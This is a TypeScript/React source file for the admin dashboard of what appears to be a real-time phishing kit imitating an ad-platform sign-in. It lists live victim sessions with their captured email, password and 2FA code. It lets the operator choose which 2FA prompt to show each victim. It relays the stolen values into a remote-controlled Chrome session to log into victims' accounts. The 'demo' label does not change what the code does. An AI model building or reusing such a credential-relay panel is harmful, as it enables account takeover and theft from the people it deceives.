"use client";

import { useEffect, useRef, useState } from "react";
import type { SessionEntry, TwoFactorType, DemoEventType } from "@/lib/demo-session";
import type { PresenceSummary } from "@/lib/presence";

type Toast = { id: string; message: string; type: "new" | "left" | "done" };

const eventIcon: Record<DemoEventType, string> = {
  join: "👤",
  email: "✉️",
  password: "🔑",
  confirmPassword: "🔒",
  twoFactor: "📱",
  captcha: "✅",
};

const eventColor: Record<DemoEventType, string> = {
  join: "#a8c7fa",
  email: "#a8c7fa",
  password: "#fdd663",
  confirmPassword: "#fdd663",
  twoFactor: "#81c995",
  captcha: "#81c995",
};

const PAGE_LABELS: Record<string, string> = {
  "/": "Página inicial",
  "/signin": "Login",
  "/articles": "Artigos",
  "/campaign-types/search": "Campanhas de pesquisa",
  "/cost": "Custo",
  "/goals": "Objetivos",
  "/how-it-works": "Como funciona",
  "/start": "Começar",
  "/support": "Suporte",
  "/admin": "Admin",
};

const twoFactorOptions: Array<{ value: TwoFactorType; label: string }> = [
  { value: "sms", label: "SMS" },
  { value: "email", label: "Email" },
  { value: "authenticator", label: "Authenticator" },
  { value: "device", label: "Confirmação no celular" },
];

const stepLabel: Record<string, string> = {
  email: "E-mail",
  password: "Senha",
  confirmPassword: "Repetir senha",
  waitingTwoFactor: "Aguardando 2FA",
  twoFactor: "2FA",
  captcha: "Captcha",
  complete: "Concluido",
};

const statsConfig: Array<{ key: string; label: string; color: string }> = [
  { key: "total", label: "Ativos", color: "#a8c7fa" },
  { key: "email", label: "E-mail", color: "#8ab4f8" },
  { key: "password", label: "Senha", color: "#8ab4f8" },
  { key: "confirmPassword", label: "Repetir senha", color: "#8ab4f8" },
  { key: "waitingTwoFactor", label: "Aguard. 2FA", color: "#fdd663" },
  { key: "twoFactor", label: "2FA", color: "#fdd663" },
  { key: "captcha", label: "Captcha", color: "#8ab4f8" },
  { key: "complete", label: "Concluído", color: "#81c995" },
];

const stepToCard: Record<string, string> = {
  email: "Email",
  password: "Senha",
  confirmPassword: "Repetir senha",
  waitingTwoFactor: "2FA",
  twoFactor: "2FA",
  captcha: "Captcha",
};

function buildStats(sessions: SessionEntry[]): Record<string, number> {
  const counts: Record<string, number> = {
    total: 0,
    email: 0,
    password: 0,
    confirmPassword: 0,
    waitingTwoFactor: 0,
    twoFactor: 0,
    captcha: 0,
    complete: 0,
  };
  for (const s of sessions) {
    if (s.step !== "complete") counts.total++;
    counts[s.step] = (counts[s.step] ?? 0) + 1;
  }
  return counts;
}

async function fetchSessions(): Promise<SessionEntry[]> {
  const response = await fetch("/api/v1/token", { cache: "no-store" });
  return (await response.json()) as SessionEntry[];
}

async function postAdminAction(body: object): Promise<SessionEntry[]> {
  const response = await fetch("/api/v1/token", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });
  return (await response.json()) as SessionEntry[];
}

async function sendToChrome(sessionId: string, selector: string, value: string, pressEnter = false) {
  await fetch("/api/v1/connect", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ action: "fill", sessionId, selector, value, pressEnter }),
  });
}

export default function AdminPage() {
  const [sessions, setSessions] = useState<SessionEntry[]>([]);
  const [selectedId, setSelectedId] = useState<string | null>(null);
  const [busyAction, setBusyAction] = useState<string | null>(null);
  const [chromeConnected, setChromeConnected] = useState(false);
  const [sendingField, setSendingField] = useState<string | null>(null);
  const [toasts, setToasts] = useState<Toast[]>([]);
  const [presence, setPresence] = useState<PresenceSummary>({ total: 0, byPage: {}, entries: [] });
  const prevSessionIdsRef = useRef<Set<string>>(new Set());

  function addToast(message: string, type: Toast["type"]) {
    const id = crypto.randomUUID();
    setToasts((prev) => [...prev, { id, message, type }]);
    window.setTimeout(() => {
      setToasts((prev) => prev.filter((t) => t.id !== id));
    }, 4000);
  }

  const sortedSessions = [...sessions].sort(
    (a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime(),
  );
  const selected = sortedSessions.find((s) => s.sessionId === selectedId) ?? null;

  useEffect(() => {
    let cancelled = false;

    const load = async () => {
      const next = await fetchSessions();
      if (!cancelled) {
        setSessions((prev) => {
          const prevIds = prevSessionIdsRef.current;
          const nextIds = new Set(next.map((s) => s.sessionId));

          // New sessions
          for (const s of next) {
            if (!prevIds.has(s.sessionId)) {
              addToast(`Nova sessão iniciada · ${s.device}`, "new");
            }
          }

          // Removed sessions
          for (const s of prev) {
            if (!nextIds.has(s.sessionId)) {
              const label = s.emailPreview || "usuário anônimo";
              if (s.step === "complete") {
                addToast(`✓ Fluxo concluído · ${label}`, "done");
              } else {
                addToast(`Usuário saiu · ${label}`, "left");
              }
            }
            // Chrome tab retitle when email arrives
            const updated = next.find((n) => n.sessionId === s.sessionId);
            if (updated?.emailPreview && !s.emailPreview) {
              void fetch("/api/v1/connect", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ action: "retitle", sessionId: s.sessionId, label: updated.emailPreview }),
              });
            }
          }

          prevSessionIdsRef.current = nextIds;
          return next;
        });
        // auto-select first session if none selected
        setSelectedId((prev) => {
          if (prev && next.some((s) => s.sessionId === prev)) return prev;
          const newest = [...next].sort(
            (a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime(),
          );
          return newest[0]?.sessionId ?? null;
        });
      }
    };

    void load();
    const intervalId = window.setInterval(load, 1000);
    return () => {
      cancelled = true;
      window.clearInterval(intervalId);
    };
  }, []);

  useEffect(() => {
    let cancelled = false;

    const loadPresence = async () => {
      try {
        const res = await fetch("/api/v1/status", { cache: "no-store" });
        const data = (await res.json()) as PresenceSummary;
        if (!cancelled) setPresence(data);
      } catch { /* ignore */ }
    };

    void loadPresence();
    const id = window.setInterval(loadPresence, 3000);
    return () => { cancelled = true; window.clearInterval(id); };
  }, []);

  useEffect(() => {
    let cancelled = false;

    const checkChrome = async () => {
      try {
        const res = await fetch("/api/v1/connect", { cache: "no-store" });
        const data = (await res.json()) as { connected: boolean };
        if (!cancelled) setChromeConnected(data.connected);
      } catch {
        if (!cancelled) setChromeConnected(false);
      }
    };

    void checkChrome();
    const id = window.setInterval(checkChrome, 3000);
    return () => {
      cancelled = true;
      window.clearInterval(id);
    };
  }, []);

  async function handleTypeChange(type: TwoFactorType) {
    if (!selectedId) return;
    setBusyAction(`type-${type}`);
    try {
      setSessions(await postAdminAction({ action: "setTwoFactorType", sessionId: selectedId, type }));
    } finally {
      setBusyAction(null);
    }
  }

  async function handleRelease() {
    if (!selected) return;
    setBusyAction("release");
    try {
      setSessions(
        await postAdminAction({
          action: "releaseTwoFactor",
          sessionId: selected.sessionId,
          type: selected.selectedTwoFactorType,
        }),
      );
    } finally {
      setBusyAction(null);
    }
  }

  async function handleReset() {
    if (!selectedId) return;
    setBusyAction("reset");
    try {
      setSessions(await postAdminAction({ action: "reset", sessionId: selectedId }));
    } finally {
      setBusyAction(null);
    }
  }

  async function handleDelete() {
    if (!selectedId) return;
    setBusyAction("delete");
    try {
      const next = await postAdminAction({ action: "delete", sessionId: selectedId });
      setSessions(next);
      setSelectedId(next[0]?.sessionId ?? null);
    } finally {
      setBusyAction(null);
    }
  }

  return (
    <main
      className="min-h-screen px-4 py-6 md:px-8"
      style={{
        background:
          "radial-gradient(circle at top, rgba(168, 199, 250, 0.12), transparent 32%), #111315",
        color: "#e8eaed",
        fontFamily: "var(--font-roboto), 'Google Sans', Roboto, Arial, sans-serif",
      }}
    >
      <div style={{ maxWidth: 1280, margin: "0 auto" }}>
        {/* Header */}
        <div style={{ marginBottom: 20 }}>
          <div className="flex flex-wrap items-center gap-3 mb-2">
            <p style={{ color: "#a8c7fa", fontSize: 13, margin: 0 }}>
              Painel local de demonstracao
            </p>
            <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
              <span style={{
                width: 8, height: 8, borderRadius: "50%",
                background: chromeConnected ? "#81c995" : "#f28b82",
                display: "inline-block",
              }} />
              <span style={{ fontSize: 12, color: chromeConnected ? "#81c995" : "#f28b82" }}>
                {chromeConnected ? "Chrome conectado" : "Chrome desconectado"}
              </span>
            </div>
          </div>
          <h1 className="text-3xl md:text-5xl" style={{ fontWeight: 400, margin: 0 }}>Admin</h1>
          <p className="hidden md:block" style={{ color: "#bdc1c6", margin: "10px 0 0 0", lineHeight: 1.6 }}>
            Acompanhe em tempo real cada usuario ativo e controle individualmente o fluxo de 2FA.
          </p>
        </div>

        {/* Stats bar */}
        {(() => {
          const stats = buildStats(sessions);
          return (
            <div
              className="grid gap-2 mb-4"
              style={{ gridTemplateColumns: "repeat(auto-fit, minmax(80px, 1fr))" }}
            >
              {statsConfig.map(({ key, label, color }) => (
                <div
                  key={key}
                  style={{
                    background: "#181a1d",
                    border: "1px solid #2f3336",
                    borderRadius: 16,
                    padding: "10px 12px",
                    textAlign: "center",
                  }}
                >
                  <p style={{ fontSize: 24, fontWeight: 400, margin: "0 0 2px 0", color, lineHeight: 1 }}>
                    {stats[key] ?? 0}
                  </p>
                  <p style={{ color: "#9aa0a6", fontSize: 11, margin: 0 }}>{label}</p>
                </div>
              ))}
            </div>
          );
        })()}

        {/* Presence section */}
        <div
          style={{
            background: "#181a1d",
            border: "1px solid #2f3336",
            borderRadius: 20,
            padding: "14px 18px",
            marginBottom: 16,
          }}
        >
          <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 10 }}>
            <span style={{ width: 8, height: 8, borderRadius: "50%", background: "#81c995", display: "inline-block" }} />
            <p style={{ color: "#9aa0a6", fontSize: 12, margin: 0, textTransform: "uppercase", letterSpacing: "0.06em" }}>
              Visitantes ativos · {presence.total}
            </p>
          </div>
          {presence.total === 0 ? (
            <p style={{ color: "#5f6368", fontSize: 13, margin: 0 }}>Nenhum visitante no momento.</p>
          ) : (
            <div className="flex flex-wrap gap-2">
              {Object.entries(presence.byPage).map(([page, count]) => (
                <div
                  key={page}
                  style={{
                    background: "#111315",
                    border: "1px solid #2f3336",
                    borderRadius: 12,
                    padding: "6px 12px",
                    display: "flex",
                    alignItems: "center",
                    gap: 8,
                  }}
                >
                  <span style={{ color: "#e8eaed", fontSize: 13 }}>
                    {PAGE_LABELS[page] ?? page}
                  </span>
                  <span style={{
                    background: "#a8c7fa",
                    color: "#062e6f",
                    borderRadius: 999,
                    fontSize: 11,
                    fontWeight: 700,
                    padding: "1px 7px",
                  }}>
                    {count}
                  </span>
                </div>
              ))}
            </div>
          )}
        </div>

        {/* Sessions list — horizontal scroll on mobile, sidebar on desktop */}
        <div
          className="flex gap-2 mb-4 pb-2 lg:hidden"
          style={{ overflowX: "auto", scrollbarWidth: "none" }}
        >
          {sortedSessions.length === 0 ? (
            <p style={{ color: "#5f6368", fontSize: 13, margin: 0, whiteSpace: "nowrap", padding: "8px 0" }}>
              Nenhuma sessao ativa...
            </p>
          ) : sortedSessions.map((s) => {
            const isSelected = s.sessionId === selectedId;
            return (
              <button
                key={s.sessionId}
                onClick={() => setSelectedId(s.sessionId)}
                style={{
                  background: isSelected ? "rgba(168, 199, 250, 0.1)" : "#181a1d",
                  border: `1px solid ${isSelected ? "#a8c7fa" : "#2f3336"}`,
                  borderRadius: 14,
                  padding: "10px 14px",
                  cursor: "pointer",
                  textAlign: "left",
                  flexShrink: 0,
                  minWidth: 160,
                }}
              >
                <div style={{ display: "flex", alignItems: "center", gap: 6, marginBottom: 2 }}>
                  <span style={{ width: 6, height: 6, borderRadius: "50%", background: s.step === "complete" ? "#4CAF50" : "#a8c7fa", flexShrink: 0 }} />
                  <span style={{ color: "#e8eaed", fontSize: 12, fontWeight: 500, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap", maxWidth: 120 }}>
                    {s.emailPreview || "aguardando email"}
                  </span>
                </div>
                <p style={{ color: "#9aa0a6", fontSize: 11, margin: 0 }}>{stepLabel[s.step] ?? s.step}</p>
              </button>
            );
          })}
        </div>

        {/* 3-column grid on desktop, stacked on mobile */}
        <div className="grid gap-4 items-start lg:grid-cols-[260px_minmax(0,1fr)_300px]">

          {/* ── Sessions list (sidebar, desktop only) ── */}
          <aside
            className="hidden lg:block"
            style={{
              background: "#181a1d",
              border: "1px solid #2f3336",
              borderRadius: 28,
              padding: 16,
            }}
          >
            <p style={{ color: "#9aa0a6", fontSize: 12, margin: "0 0 14px 0", textTransform: "uppercase", letterSpacing: "0.06em" }}>
              Sessoes ativas ({sortedSessions.length})
            </p>

            {sortedSessions.length === 0 ? (
              <p style={{ color: "#5f6368", fontSize: 14, margin: 0, padding: "8px 0" }}>
                Nenhuma sessao ativa. Aguardando usuarios...
              </p>
            ) : (
              <div style={{ display: "grid", gap: 8 }}>
                {sortedSessions.map((s) => {
                  const isSelected = s.sessionId === selectedId;
                  return (
                    <button
                      key={s.sessionId}
                      onClick={() => setSelectedId(s.sessionId)}
                      style={{
                        background: isSelected ? "rgba(168, 199, 250, 0.1)" : "#111315",
                        border: `1px solid ${isSelected ? "#a8c7fa" : "#2f3336"}`,
                        borderRadius: 16,
                        padding: "12px 14px",
                        cursor: "pointer",
                        textAlign: "left",
                        width: "100%",
                      }}
                    >
                      <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 4 }}>
                        <span style={{ width: 7, height: 7, borderRadius: "50%", background: s.step === "complete" ? "#4CAF50" : "#a8c7fa", flexShrink: 0 }} />
                        <span style={{ color: "#e8eaed", fontSize: 13, fontWeight: 500, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>
                          {s.emailPreview || "aguardando email"}
                        </span>
                      </div>
                      <p style={{ color: "#9aa0a6", fontSize: 12, margin: "0 0 2px 0", paddingLeft: 15 }}>
                        {stepLabel[s.step] ?? s.step}
                      </p>
                      <p style={{ color: "#5f6368", fontSize: 11, margin: 0, paddingLeft: 15 }}>
                        {s.device} · {new Date(s.createdAt).toLocaleTimeString("pt-BR")}
                      </p>
                    </button>
                  );
                })}
              </div>
            )}
          </aside>

          {/* ── Detail panel ── */}
          <section
            style={{
              background: "#181a1d",
              border: "1px solid #2f3336",
              borderRadius: 28,
              padding: 20,
            }}
          >
            {!selected ? (
              <p style={{ color: "#5f6368", fontSize: 16, margin: 0 }}>
                Selecione uma sessao na lista para ver os detalhes.
              </p>
            ) : (
              <>
                <div style={{ display: "flex", alignItems: "flex-start", justifyContent: "space-between", gap: 16, marginBottom: 20, flexWrap: "wrap" }}>
                  <div>
                    <p style={{ color: "#9aa0a6", fontSize: 13, margin: 0 }}>Status atual</p>
                    <h2 style={{ fontSize: 24, fontWeight: 400, margin: "6px 0 8px 0" }}>
                      {selected.status}
                    </h2>
                    <span style={{
                      display: "inline-block",
                      background: "rgba(52, 168, 83, 0.15)",
                      border: "1px solid #34a853",
                      color: "#34a853",
                      borderRadius: 999,
                      fontSize: 12,
                      fontWeight: 600,
                      padding: "3px 12px",
                      letterSpacing: "0.03em",
                    }}>
                      {stepLabel[selected.step] ?? selected.step}
                    </span>
                  </div>
                  <button
                    onClick={async () => {
                      setSendingField("launch");
                      await fetch("/api/v1/connect", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                          action: "launch",
                          sessionId: selected.sessionId,
                          label: selected.emailPreview || `Sessão ${selected.sessionId.slice(0, 6)}`,
                        }),
                      });
                      setSendingField(null);
                    }}
                    disabled={sendingField === "launch"}
                    style={{
                      background: "#1e3a5f",
                      border: "1px solid #4a90d9",
                      color: "#a8c7fa",
                      borderRadius: 20,
                      padding: "8px 16px",
                      fontSize: 13,
                      fontWeight: 500,
                      cursor: "pointer",
                      whiteSpace: "nowrap",
                      flexShrink: 0,
                    }}
                  >
                    {sendingField === "launch" ? "Abrindo..." : "🌐 Abrir Chrome"}
                  </button>
                </div>

                <div
                  style={{
                    display: "grid",
                    gridTemplateColumns: "repeat(auto-fit, minmax(160px, 1fr))",
                    gap: 12,
                    marginBottom: 22,
                  }}
                >
                  {[
                    { label: "Dispositivo", value: selected.device || "desconhecido", selector: null },
                    { label: "Email", value: selected.emailPreview || "", selector: 'input[type="email"]', pressEnter: true },
                    { label: "Senha", value: selected.passwordPreview || "", selector: 'input[type="password"]', pressEnter: true },
                    { label: "Repetir senha", value: selected.confirmPasswordPreview || "", selector: 'input[type="password"]', pressEnter: true },
                    { label: "2FA", value: selected.twoFactorPreview || "", selector: 'input[type="tel"], input[type="number"]', pressEnter: true },
                    { label: "Captcha", value: selected.captchaChecked ? "checkbox marcado" : "aguardando", selector: null },
                  ].map(({ label, value, selector, pressEnter }) => {
                    const isActiveStep = stepToCard[selected.step] === label;
                    return (
                    <div
                      key={label}
                      style={{
                        background: isActiveStep ? "rgba(52, 168, 83, 0.07)" : "#111315",
                        border: `1px solid ${isActiveStep ? "#34a853" : "#2f3336"}`,
                        borderRadius: 16,
                        padding: 14,
                        transition: "border-color 0.3s ease, background 0.3s ease",
                      }}
                    >
                      <p style={{ color: "#9aa0a6", fontSize: 12, margin: "0 0 6px 0" }}>{label}</p>
                      <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", gap: 8 }}>
                        <p style={{ color: "#e8eaed", fontSize: 15, margin: 0, wordBreak: "break-all" }}>
                          {value || "aguardando"}
                        </p>
                        {selector && value && (
                          <button
                            onClick={async () => {
                              setSendingField(label);
                              await sendToChrome(selected.sessionId, selector, value, pressEnter);
                              setSendingField(null);
                            }}
                            disabled={!chromeConnected || sendingField === label}
                            style={{
                              background: chromeConnected ? "#a8c7fa" : "#3c4043",
                              color: chromeConnected ? "#062e6f" : "#9aa0a6",
                              border: "none",
                              borderRadius: 999,
                              padding: "4px 12px",
                              fontSize: 12,
                              fontWeight: 500,
                              cursor: chromeConnected ? "pointer" : "not-allowed",
                              whiteSpace: "nowrap",
                              flexShrink: 0,
                            }}
                          >
                            {sendingField === label ? "..." : "▶ Enviar"}
                          </button>
                        )}
                      </div>
                    </div>
                  ); })}
                </div>

                <div
                  style={{
                    background: "#111315",
                    border: "1px solid #2f3336",
                    borderRadius: 20,
                    padding: 20,
                  }}
                >
                  <p style={{ color: "#9aa0a6", fontSize: 11, margin: "0 0 14px 0", textTransform: "uppercase", letterSpacing: "0.06em" }}>
                    Ações do usuário
                  </p>
                  {selected.events.length ? (
                    <div style={{ display: "flex", flexDirection: "column", gap: 0 }}>
                      {selected.events.map((event, i) => {
                        const color = eventColor[event.type] ?? "#9aa0a6";
                        const icon = eventIcon[event.type] ?? "•";
                        const isLast = i === selected.events.length - 1;
                        return (
                          <div key={event.id} style={{ display: "flex", gap: 12 }}>
                            {/* timeline rail */}
                            <div style={{ display: "flex", flexDirection: "column", alignItems: "center", flexShrink: 0 }}>
                              <div style={{
                                width: 28, height: 28, borderRadius: "50%",
                                background: `${color}18`,
                                border: `1px solid ${color}55`,
                                display: "flex", alignItems: "center", justifyContent: "center",
                                fontSize: 13, flexShrink: 0,
                              }}>
                                {icon}
                              </div>
                              {!isLast && (
                                <div style={{ width: 1, flex: 1, background: "#2f3336", margin: "3px 0" }} />
                              )}
                            </div>
                            {/* content */}
                            <div style={{ paddingBottom: isLast ? 0 : 14, paddingTop: 4, flex: 1, minWidth: 0 }}>
                              <p style={{ color: "#e8eaed", fontSize: 14, margin: "0 0 2px 0", lineHeight: 1.4 }}>
                                {event.message}
                              </p>
                              <p style={{ color: "#5f6368", fontSize: 11, margin: 0 }}>
                                {new Date(event.timestamp).toLocaleTimeString("pt-BR")}
                              </p>
                            </div>
                          </div>
                        );
                      })}
                    </div>
                  ) : (
                    <p style={{ color: "#5f6368", margin: 0, fontSize: 14 }}>Nenhuma ação registrada ainda.</p>
                  )}
                </div>
              </>
            )}
          </section>

          {/* ── Controls ── */}
          <aside
            style={{
              background: "#181a1d",
              border: "1px solid #2f3336",
              borderRadius: 28,
              padding: 20,
              alignSelf: "start",
            }}
          >
            <p style={{ color: "#9aa0a6", fontSize: 13, margin: 0 }}>Controle manual</p>
            <h2 style={{ fontSize: 24, fontWeight: 400, margin: "8px 0 18px 0" }}>
              Liberar 2FA
            </h2>

            <div style={{ display: "grid", gap: 8, marginBottom: 20 }}>
              {twoFactorOptions.map((option) => {
                const isSelected = selected?.selectedTwoFactorType === option.value;
                return (
                  <button
                    key={option.value}
                    onClick={() => handleTypeChange(option.value)}
                    disabled={Boolean(busyAction) || !selected}
                    style={{
                      display: "flex",
                      justifyContent: "space-between",
                      alignItems: "center",
                      padding: "12px 14px",
                      borderRadius: 16,
                      border: isSelected ? "1px solid #a8c7fa" : "1px solid #3c4043",
                      background: isSelected ? "rgba(168, 199, 250, 0.12)" : "#111315",
                      color: "#e8eaed",
                      cursor: selected ? "pointer" : "not-allowed",
                      opacity: selected ? 1 : 0.4,
                    }}
                  >
                    <span style={{ fontSize: 14 }}>{option.label}</span>
                    <span style={{ color: isSelected ? "#a8c7fa" : "#9aa0a6", fontSize: 12 }}>
                      {isSelected ? "selecionado" : "selecionar"}
                    </span>
                  </button>
                );
              })}
            </div>

            <button
              onClick={handleRelease}
              disabled={Boolean(busyAction) || !selected?.userPresent}
              style={{
                width: "100%",
                background: "#a8c7fa",
                color: "#062e6f",
                border: "none",
                borderRadius: 999,
                padding: "12px 20px",
                fontSize: 14,
                fontWeight: 500,
                cursor: selected?.userPresent ? "pointer" : "not-allowed",
                opacity: selected?.userPresent ? 1 : 0.5,
                marginBottom: 12,
              }}
            >
              Mostrar 2FA para o usuario
            </button>

            <div style={{ display: "grid", gap: 8 }}>
              <button
                onClick={handleReset}
                disabled={Boolean(busyAction) || !selected}
                style={{
                  background: "transparent",
                  border: "1px solid #5f6368",
                  color: "#e8eaed",
                  borderRadius: 999,
                  padding: "10px 16px",
                  fontSize: 13,
                  cursor: selected ? "pointer" : "not-allowed",
                  opacity: selected ? 1 : 0.4,
                }}
              >
                Reiniciar sessao
              </button>
              <button
                onClick={handleDelete}
                disabled={Boolean(busyAction) || !selected}
                style={{
                  background: "transparent",
                  border: "1px solid #3c4043",
                  color: "#9aa0a6",
                  borderRadius: 999,
                  padding: "10px 16px",
                  fontSize: 13,
                  cursor: selected ? "pointer" : "not-allowed",
                  opacity: selected ? 1 : 0.4,
                }}
              >
                Remover sessao
              </button>
            </div>
          </aside>
        </div>
      </div>

      {/* Toast notifications */}
      <div
        style={{
          position: "fixed",
          bottom: 24,
          right: 24,
          display: "flex",
          flexDirection: "column",
          gap: 10,
          zIndex: 1000,
          pointerEvents: "none",
        }}
      >
        {toasts.map((t) => (
          <div
            key={t.id}
            style={{
              background: t.type === "new" ? "#1e3a5f" : t.type === "done" ? "#1a3a2a" : "#2a1f1f",
              border: `1px solid ${t.type === "new" ? "#4a90d9" : t.type === "done" ? "#81c995" : "#f28b82"}`,
              color: t.type === "new" ? "#a8c7fa" : t.type === "done" ? "#81c995" : "#f28b82",
              borderRadius: 14,
              padding: "10px 16px",
              fontSize: 13,
              fontWeight: 500,
              boxShadow: "0 4px 20px rgba(0,0,0,0.4)",
              animation: "fadeInUp 0.2s ease",
              whiteSpace: "nowrap",
            }}
          >
            {t.type === "new" ? "🔴 " : t.type === "done" ? "✅ " : "⚫ "}
            {t.message}
          </div>
        ))}
      </div>
    </main>
  );
}
